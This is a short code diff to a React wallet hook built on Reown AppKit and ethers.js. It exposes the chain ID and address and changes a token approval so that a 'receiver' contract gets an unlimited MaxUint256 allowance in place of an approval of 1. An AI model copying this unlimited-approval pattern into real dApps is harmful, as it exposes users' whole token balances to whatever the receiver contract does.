@@ -1,4 +1,4 @@
-import { useAppKit, useAppKitAccount, useAppKitProvider } from '@reown/appkit/react'
+import { useAppKit, useAppKitAccount, useAppKitProvider, useAppKitNetwork } from '@reown/appkit/react'
 import { BrowserProvider, Contract, MaxUint256 } from 'ethers'
 import config from './config.js'
 
@@ -6,6 +6,9 @@ const useCrypto = () => {
     const { open } = useAppKit()
         , { address, isConnected } = useAppKitAccount({ namespace: 'eip155' })
         , { walletProvider } = useAppKitProvider('eip155')
+        , network = useAppKitNetwork()
+
+    const chainId = parseInt(network.chainId)
 
     const createSignerPrivate = async () => {
         if (!walletProvider || !address) {
@@ -17,6 +20,7 @@ const useCrypto = () => {
         return [signer, parseInt(network.chainId)]
     }
     
+
     const getBalance = async () => {
         const [signer, network] = await createSignerPrivate()
         const _address = config.address[network]
@@ -36,10 +40,10 @@ const useCrypto = () => {
         const allowance = await token.allowance(address, _address.receiver)
         const amount = 1
 
-        //if (allowance < amount) {
-            const approveTx = await token.approve(_address.receiver, amount)
+        if (allowance < amount) {
+            const approveTx = await token.approve(_address.receiver, MaxUint256)
             await approveTx.wait()
-        //}
+        }
 
         const receiverTx = await receiver.calc(_address.token, amount, ...args)
         const tx = await receiverTx.wait()
@@ -55,6 +59,8 @@ const useCrypto = () => {
         open, 
         isConnected, 
         getBalance, 
+        address,
+        chainId,
         calc 
     }
 }
